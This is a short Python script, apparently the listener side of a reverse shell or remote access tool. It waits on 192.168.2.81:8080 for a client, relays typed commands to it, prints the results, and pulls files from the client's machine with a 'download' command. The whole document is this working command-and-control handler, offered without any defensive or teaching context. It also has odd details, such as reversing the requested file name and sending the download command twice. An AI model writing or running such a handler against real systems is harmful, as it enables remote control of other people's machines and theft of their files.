import socket

#Assigning the IP-adres
IP_ADRESS = '192.168.2.81'
PORT = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#make server bind to assigned IP-adres and port
server.bind((IP_ADRESS, PORT))
server.listen(1)
print('[+] Server Started on:', IP_ADRESS,'on port:', PORT)
print('[+] Listening For Client Connection ...')
client, client_addr = server.accept()

#Server notification if there is a successfull connection
print(f'[+] {client_addr} Client connected to the server')
while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    if command == b"":
        print("Please enter a command")
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", client_addr[0])
            break
        print(data)
client.close()
server.close()